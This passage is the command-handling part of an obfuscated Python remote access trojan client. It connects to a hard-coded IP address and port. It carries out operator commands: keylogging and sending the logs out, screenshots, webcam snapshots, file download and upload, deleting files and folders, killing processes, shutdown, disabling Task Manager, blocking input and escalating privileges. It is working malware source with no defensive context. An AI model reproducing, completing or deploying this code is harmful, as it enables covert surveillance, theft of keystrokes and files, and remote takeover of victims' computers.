            elif O00O0OO000O0000O0 .startswith ("enable")and O00O0OO000O0000O0 .endswith ("--mouse"):#line:362:elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl =False #line:363:mousedbl = False
                s .send ("Mouse is enabled".encode ())#line:364:s.send("Mouse is enabled".encode())
            elif O00O0OO000O0000O0 .startswith ("enable")and O00O0OO000O0000O0 .endswith ("--all"):#line:366:elif command.startswith("enable") and command.endswith("--all"):
                user32 .BlockInput (False )#line:367:user32.BlockInput(False)
                s .send ("Keyboard and mouse are enabled".encode ())#line:368:s.send("Keyboard and mouse are enabled".encode())
            elif O00O0OO000O0000O0 =='turnoffmon':#line:370:elif command == 'turnoffmon':
                s .send (f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode ())#line:371:s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                user32 .SendMessage (HWND_BROADCAST ,WM_SYSCOMMAND ,SC_MONITORPOWER ,2 )#line:372:user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            elif O00O0OO000O0000O0 =='turnonmon':#line:374:elif command == 'turnonmon':
                s .send (f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode ())#line:375:s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                user32 .SendMessage (HWND_BROADCAST ,WM_SYSCOMMAND ,SC_MONITORPOWER ,-1 )#line:376:user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            elif O00O0OO000O0000O0 =='extendrights':#line:378:elif command == 'extendrights':
                ctypes .windll .shell32 .ShellExecuteW (None ,"runas",sys .executable ," ".join (sys .argv ),None ,1 )#line:379:ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                O0OOO0OO00O0O00O0 =f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"#line:380:sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s .send (O0OOO0OO00O0O00O0 .encode ())#line:381:s.send(sending.encode())
            elif O00O0OO000O0000O0 =='isuseradmin':#line:383:elif command == 'isuseradmin':
                if ctypes .windll .shell32 .IsUserAnAdmin ()==1 :#line:384:if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    O0OOO0OO00O0O00O0 =f'{socket.gethostbyname(socket.gethostname())} is admin'#line:385:sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s .send (O0OOO0OO00O0O00O0 .encode ())#line:386:s.send(sending.encode())
                else :#line:387:else:
                    O0OOO0OO00O0O00O0 =f'{socket.gethostbyname(socket.gethostname())} is not admin'#line:388:sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s .send (O0OOO0OO00O0O00O0 .encode ())#line:389:s.send(sending.encode())
            elif O00O0OO000O0000O0 =='keyscan_start':#line:391:elif command == 'keyscan_start':
                global klgr #line:392:global klgr
                klgr =True #line:393:klgr = True
                kernel32 .CreateFileW (b'keylogs.txt',GENERIC_WRITE &GENERIC_READ ,FILE_SHARE_WRITE &FILE_SHARE_READ &FILE_SHARE_DELETE ,None ,CREATE_ALWAYS ,0 ,0 )#line:396:None, CREATE_ALWAYS , 0, 0)
                Thread (target =O0O0O00OO0OO00OO0 .keylogger ,daemon =True ).start ()#line:397:Thread(target=self.keylogger, daemon=True).start()
                s .send ("Keylogger is started".encode ())#line:398:s.send("Keylogger is started".encode())
            elif O00O0OO000O0000O0 =='send_logs':#line:400:elif command == 'send_logs':
                try :#line:401:try:
                    O0OO0O000O0OO00OO =open ("keylogs.txt",'r')#line:402:f = open("keylogs.txt", 'r')
                    OO0OO0OO0O0OO0OO0 =O0OO0O000O0OO00OO .readlines ()#line:403:lines = f.readlines()
                    O0OO0O000O0OO00OO .close ()#line:404:f.close()
                    s .send (str (OO0OO0OO0O0OO0OO0 ).encode ())#line:405:s.send(str(lines).encode())
                    os .remove ('keylogs.txt')#line:406:os.remove('keylogs.txt')
                except :#line:407:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:408:self.errorsend()
            elif O00O0OO000O0000O0 =='stop_keylogger':#line:410:elif command == 'stop_keylogger':
                klgr =False #line:411:klgr = False
                s .send ("The session of keylogger is terminated".encode ())#line:412:s.send("The session of keylogger is terminated".encode())
            elif O00O0OO000O0000O0 =='cpu_cores':#line:414:elif command == 'cpu_cores':
                O0O00O0OO00OOO0OO =os .cpu_count ()#line:415:output = os.cpu_count()
                s .send (str (O0O00O0OO00OOO0OO ).encode ())#line:416:s.send(str(output).encode())
            elif O00O0OO000O0000O0 [:7 ]=='delfile':#line:418:elif command[:7] == 'delfile':
                try :#line:419:try:
                    os .remove (O00O0OO000O0000O0 [8 :])#line:420:os.remove(command[8:])
                    s .send (f'{O00O0OO000O0000O0[8:]} was successfully deleted'.encode ())#line:421:s.send(f'{command[8:]} was successfully deleted'.encode())
                except :#line:422:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:423:self.errorsend()
            elif O00O0OO000O0000O0 [:8 ]=='editfile':#line:425:elif command[:8] == 'editfile':
                try :#line:426:try:
                    with open (O00O0OO000O0000O0 .split (" ")[1 ],'a')as O0OO0O000O0OO00OO :#line:427:with open(command.split(" ")[1], 'a') as f:
                        O0OO0O000O0OO00OO .write (O00O0OO000O0000O0 .split (" ")[2 ])#line:428:f.write(command.split(" ")[2])
                        O0OO0O000O0OO00OO .close ()#line:429:f.close()
                    O0OOO0OO00O0O00O0 =f'{O00O0OO000O0000O0.split(" ")[2]} was written to {O00O0OO000O0000O0.split(" ")[1]}'#line:430:sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s .send (O0OOO0OO00O0O00O0 .encode ())#line:431:s.send(sending.encode())
                except :#line:432:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:433:self.errorsend()
            elif O00O0OO000O0000O0 [:2 ]=='cp':#line:435:elif command[:2] == 'cp':
                try :#line:436:try:
                    shutil .copyfile (O00O0OO000O0000O0 .split (" ")[1 ],O00O0OO000O0000O0 .split (" ")[2 ])#line:437:shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s .send (f'{O00O0OO000O0000O0.split(" ")[1]} was copied to {O00O0OO000O0000O0.split(" ")[2]}'.encode ())#line:438:s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except :#line:439:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:440:self.errorsend()
            elif O00O0OO000O0000O0 [:2 ]=='mv':#line:442:elif command[:2] == 'mv':
                try :#line:443:try:
                    shutil .move (O00O0OO000O0000O0 .split (" ")[1 ],O00O0OO000O0000O0 .split (" ")[2 ])#line:444:shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s .send (f'File was moved from {O00O0OO000O0000O0.split(" ")[1]} to {O00O0OO000O0000O0.split(" ")[2]}'.encode ())#line:445:s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except :#line:446:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:447:self.errorsend()
            elif O00O0OO000O0000O0 [:2 ]=='cd':#line:449:elif command[:2] == 'cd':
                O00O0OO000O0000O0 =O00O0OO000O0000O0 [3 :]#line:450:command = command[3:]
                try :#line:451:try:
                    os .chdir (O00O0OO000O0000O0 )#line:452:os.chdir(command)
                    OOO0O00O00O000O0O =str (os .getcwd ())#line:453:curdir = str(os.getcwd())
                    s .send (OOO0O00O00O000O0O .encode ())#line:454:s.send(curdir.encode())
                except :#line:455:except:
                    s .send ("No such directory".encode ())#line:456:s.send("No such directory".encode())
            elif O00O0OO000O0000O0 =='cd ..':#line:458:elif command == 'cd ..':
                os .chdir ('..')#line:459:os.chdir('..')
                OOO0O00O00O000O0O =str (os .getcwd ())#line:460:curdir = str(os.getcwd())
                s .send (OOO0O00O00O000O0O .encode ())#line:461:s.send(curdir.encode())
            elif O00O0OO000O0000O0 =='dir':#line:463:elif command == 'dir':
                try :#line:464:try:
                    O0O00O0OO00OOO0OO =subprocess .check_output (["dir"],shell =True )#line:465:output = subprocess.check_output(["dir"], shell=True)
                    O0O00O0OO00OOO0OO =O0O00O0OO00OOO0OO .decode ('utf8',errors ='ignore')#line:466:output = output.decode('utf8', errors='ignore')
                    s .send (O0O00O0OO00OOO0OO .encode ())#line:467:s.send(output.encode())
                except :#line:468:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:469:self.errorsend()
            elif O00O0OO000O0000O0 [1 :2 ]==':':#line:471:elif command[1:2] == ':':
                try :#line:472:try:
                    os .chdir (O00O0OO000O0000O0 )#line:473:os.chdir(command)
                    OOO0O00O00O000O0O =str (os .getcwd ())#line:474:curdir = str(os.getcwd())
                    s .send (OOO0O00O00O000O0O .encode ())#line:475:s.send(curdir.encode())
                except :#line:476:except:
                    s .send ("No such directory".encode ())#line:477:s.send("No such directory".encode())
            elif O00O0OO000O0000O0 [:10 ]=='createfile':#line:479:elif command[:10] == 'createfile':
                kernel32 .CreateFileW (O00O0OO000O0000O0 [11 :],GENERIC_WRITE &GENERIC_READ ,FILE_SHARE_WRITE &FILE_SHARE_READ &FILE_SHARE_DELETE ,None ,CREATE_ALWAYS ,0 ,0 )#line:482:None, CREATE_ALWAYS , 0, 0)
                s .send (f'{O00O0OO000O0000O0[11:]} was created'.encode ())#line:483:s.send(f'{command[11:]} was created'.encode())
            elif O00O0OO000O0000O0 [:10 ]=='searchfile':#line:485:elif command[:10] == 'searchfile':
                for OOOOOO0O0000O0O00 in glob .glob (O00O0OO000O0000O0 .split (" ")[2 ]+"\\**\*",recursive =True ):#line:486:for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if OOOOOO0O0000O0O00 .endswith (O00O0OO000O0000O0 .split (" ")[1 ]):#line:487:if x.endswith(command.split(" ")[1]):
                        OOO0O000OOO0O0O0O =os .path .abspath (OOOOOO0O0000O0O00 )#line:488:path = os.path.abspath(x)
                        s .send (str (OOO0O000OOO0O0O0O ).encode ())#line:489:s.send(str(path).encode())
                    else :#line:490:else:
                        continue #line:491:continue
            elif O00O0OO000O0000O0 =='curpid':#line:493:elif command == 'curpid':
                O00000OO0OO0O0O0O =os .getpid ()#line:494:pid = os.getpid()
                s .send (str (O00000OO0OO0O0O0O ).encode ())#line:495:s.send(str(pid).encode())
            elif O00O0OO000O0000O0 =='drivers':#line:497:elif command == 'drivers':
                O000OOO00O00O0OOO =[]#line:498:drives = []
                OOO0O0OOOOO000O0O =kernel32 .GetLogicalDrives ()#line:499:bitmask = kernel32.GetLogicalDrives()
                O0000OO000OO00OO0 =ord ('A')#line:500:letter = ord('A')
                while OOO0O0OOOOO000O0O >0 :#line:501:while bitmask > 0:
                    if OOO0O0OOOOO000O0O &1 :#line:502:if bitmask & 1:
                        O000OOO00O00O0OOO .append (chr (O0000OO000OO00OO0 )+':\\')#line:503:drives.append(chr(letter) + ':\\')
                    OOO0O0OOOOO000O0O >>=1 #line:504:bitmask >>= 1
                    O0000OO000OO00OO0 +=1 #line:505:letter += 1
                s .send (str (O000OOO00O00O0OOO ).encode ())#line:506:s.send(str(drives).encode())
            elif O00O0OO000O0000O0 [:4 ]=='kill':#line:508:elif command[:4] == 'kill':
                try :#line:509:try:
                    os .system (f'TASKKILL /F /im {O00O0OO000O0000O0[5:]}')#line:510:os.system(f'TASKKILL /F /im {command[5:]}')
                    s .send (f'{O00O0OO000O0000O0[5:]} was terminated'.encode ())#line:511:s.send(f'{command[5:]} was terminated'.encode())
                except :#line:512:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:513:self.errorsend()
            elif O00O0OO000O0000O0 =='shutdown':#line:515:elif command == 'shutdown':
                os .system ('shutdown /s /t 1')#line:516:os.system('shutdown /s /t 1')
                O0OOO0OO00O0O00O0 =f"{socket.gethostbyname(socket.gethostname())} was shutdown"#line:517:sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s .send ()#line:518:s.send()
            elif O00O0OO000O0000O0 =='disabletaskmgr':#line:520:elif command == 'disabletaskmgr':
                global block #line:521:global block
                block =True #line:522:block = True
                Thread (target =O0O0O00OO0OO00OO0 .block_task_manager ,daemon =True ).start ()#line:523:Thread(target=self.block_task_manager, daemon=True).start()
                s .send ("Task Manager is disabled".encode ())#line:524:s.send("Task Manager is disabled".encode())
            elif O00O0OO000O0000O0 =='enabletaskmgr':#line:526:elif command == 'enabletaskmgr':
                block =False #line:527:block = False
                s .send ("Task Manager is enabled".encode ())#line:528:s.send("Task Manager is enabled".encode())
            elif O00O0OO000O0000O0 =='localtime':#line:530:elif command == 'localtime':
                OO0O0OO000OO00OOO =datetime .now ()#line:531:now = datetime.now()
                OO000000O00OO0O00 =OO0O0OO000OO00OOO .strftime ("%H:%M:%S")#line:532:current_time = now.strftime("%H:%M:%S")
                s .send (str (OO000000O00OO0O00 ).encode ())#line:533:s.send(str(current_time).encode())
            elif O00O0OO000O0000O0 [:9 ]=='startfile':#line:535:elif command[:9] == 'startfile':
                try :#line:536:try:
                    s .send (f'{O00O0OO000O0000O0[10:]} was started'.encode ())#line:537:s.send(f'{command[10:]} was started'.encode())
                    os .startfile (O00O0OO000O0000O0 [10 :])#line:538:os.startfile(command[10:])
                except :#line:539:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:540:self.errorsend()
            elif O00O0OO000O0000O0 [:8 ]=='download':#line:542:elif command[:8] == 'download':
                try :#line:543:try:
                    OO0O00OOO0OO000OO =open (O00O0OO000O0000O0 .split (" ")[1 ],'rb')#line:544:file = open(command.split(" ")[1], 'rb')
                    O0O00000OOOO0000O =OO0O00OOO0OO000OO .read ()#line:545:data = file.read()
                    s .send (O0O00000OOOO0000O )#line:546:s.send(data)
                except :#line:547:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:548:self.errorsend()
            elif O00O0OO000O0000O0 =='upload':#line:550:elif command == 'upload':
                OOOO00O0OO0OO00O0 =s .recv (6000 )#line:551:filename = s.recv(6000)
                OO0000OOO0OO0OO00 =open (OOOO00O0OO0OO00O0 ,'wb')#line:552:newfile = open(filename, 'wb')
                O0O00000OOOO0000O =s .recv (6000 )#line:553:data = s.recv(6000)
                OO0000OOO0OO0OO00 .write (O0O00000OOOO0000O )#line:554:newfile.write(data)
                OO0000OOO0OO0OO00 .close ()#line:555:newfile.close()
            elif O00O0OO000O0000O0 [:5 ]=='mkdir':#line:557:elif command[:5] == 'mkdir':
                try :#line:558:try:
                    os .mkdir (O00O0OO000O0000O0 [6 :])#line:559:os.mkdir(command[6:])
                    s .send (f'Directory {O00O0OO000O0000O0[6:]} was created'.encode ())#line:560:s.send(f'Directory {command[6:]} was created'.encode())
                except :#line:561:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:562:self.errorsend()
            elif O00O0OO000O0000O0 [:5 ]=='rmdir':#line:564:elif command[:5] == 'rmdir':
                try :#line:565:try:
                    shutil .rmtree (O00O0OO000O0000O0 [6 :])#line:566:shutil.rmtree(command[6:])
                    s .send (f'Directory {O00O0OO000O0000O0[6:]} was removed'.encode ())#line:567:s.send(f'Directory {command[6:]} was removed'.encode())
                except :#line:568:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:569:self.errorsend()
            elif O00O0OO000O0000O0 =='browser':#line:571:elif command == 'browser':
                OO0O00O00OO0OO000 =s .recv (6000 )#line:572:quiery = s.recv(6000)
                OO0O00O00OO0OO000 =OO0O00O00OO0OO000 .decode ()#line:573:quiery = quiery.decode()
                try :#line:574:try:
                    if re .search (r'\.',OO0O00O00OO0OO000 ):#line:575:if re.search(r'\.', quiery):
                        webbrowser .open_new_tab ('https://'+OO0O00O00OO0OO000 )#line:576:webbrowser.open_new_tab('https://' + quiery)
                    elif re .search (r'\ ',OO0O00O00OO0OO000 ):#line:577:elif re.search(r'\ ', quiery):
                        webbrowser .open_new_tab ('https://yandex.ru/search/?text='+OO0O00O00OO0OO000 )#line:578:webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
                    else :#line:579:else:
                        webbrowser .open_new_tab ('https://yandex.ru/search/?text='+OO0O00O00OO0OO000 )#line:580:webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
                    s .send ("The tab is opened".encode ())#line:581:s.send("The tab is opened".encode())
                except :#line:582:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:583:self.errorsend()
            elif O00O0OO000O0000O0 =='screenshot':#line:585:elif command == 'screenshot':
                try :#line:586:try:
                    OO0O00OOO0OO000OO =f'{random.randint(111111, 444444)}.png'#line:587:file = f'{random.randint(111111, 444444)}.png'
                    O00OO00O00O000O00 =f'{random.randint(555555, 999999)}.png'#line:588:file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui .screenshot (OO0O00OOO0OO000OO )#line:589:pyautogui.screenshot(file)
                    O0OOOO0O00O0O0000 =Image .open (OO0O00OOO0OO000OO )#line:590:image = Image.open(file)
                    O00OO00OOO000OO00 =O0OOOO0O00O0O0000 .resize ((1920 ,1080 ))#line:591:new_image = image.resize((1920, 1080))
                    O00OO00OOO000OO00 .save (O00OO00O00O000O00 )#line:592:new_image.save(file2)
                    OO0O00OOO0OO000OO =open (O00OO00O00O000O00 ,'rb')#line:593:file = open(file2, 'rb')
                    O0O00000OOOO0000O =OO0O00OOO0OO000OO .read ()#line:594:data = file.read()
                    s .send (O0O00000OOOO0000O )#line:595:s.send(data)
                except :#line:596:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:597:self.errorsend()
            elif O00O0OO000O0000O0 =='webcam_snap':#line:599:elif command == 'webcam_snap':
                try :#line:600:try:
                    OO0O00OOO0OO000OO =f'{random.randint(111111, 444444)}.png'#line:601:file = f'{random.randint(111111, 444444)}.png'
                    O00OO00O00O000O00 =f'{random.randint(555555, 999999)}.png'#line:602:file2 = f'{random.randint(555555, 999999)}.png'
                    global return_value ,i #line:603:global return_value, i
                    O0O0OO0O00OO0OO0O =cv2 .VideoCapture (0 )#line:604:cam = cv2.VideoCapture(0)
                    for i in range (1 ):#line:605:for i in range(1):
                        return_value ,O0OOOO0O00O0O0000 =O0O0OO0O00OO0OO0O .read ()#line:606:return_value, image = cam.read()
                        OOOO00O0OO0OO00O0 =cv2 .imwrite (f'{OO0O00OOO0OO000OO}',O0OOOO0O00O0O0000 )#line:607:filename = cv2.imwrite(f'{file}', image)
                    del (O0O0OO0O00OO0OO0O )#line:608:del(cam)
                    O0OOOO0O00O0O0000 =Image .open (OO0O00OOO0OO000OO )#line:609:image = Image.open(file)
                    O00OO00OOO000OO00 =O0OOOO0O00O0O0000 .resize ((1920 ,1080 ))#line:610:new_image = image.resize((1920, 1080))
                    O00OO00OOO000OO00 .save (O00OO00O00O000O00 )#line:611:new_image.save(file2)
                    OO0O00OOO0OO000OO =open (O00OO00O00O000O00 ,'rb')#line:612:file = open(file2, 'rb')
                    O0O00000OOOO0000O =OO0O00OOO0OO000OO .read ()#line:613:data = file.read()
                    s .send (O0O00000OOOO0000O )#line:614:s.send(data)
                except :#line:615:except:
                    O0O0O00OO0OO00OO0 .errorsend ()#line:616:self.errorsend()
            elif O00O0OO000O0000O0 =='exit':#line:618:elif command == 'exit':
                s .send (b"exit")#line:619:s.send(b"exit")
                break #line:620:break
rat =RAT_CLIENT ('138.68.79.95',8067)#line:622:rat = RAT_CLIENT('141.255.156.196', 1435)
if __name__ =='__main__':#line:624:if __name__ == '__main__':
    rat .build_connection ()#line:625:rat.build_connection()
    rat .execute ()
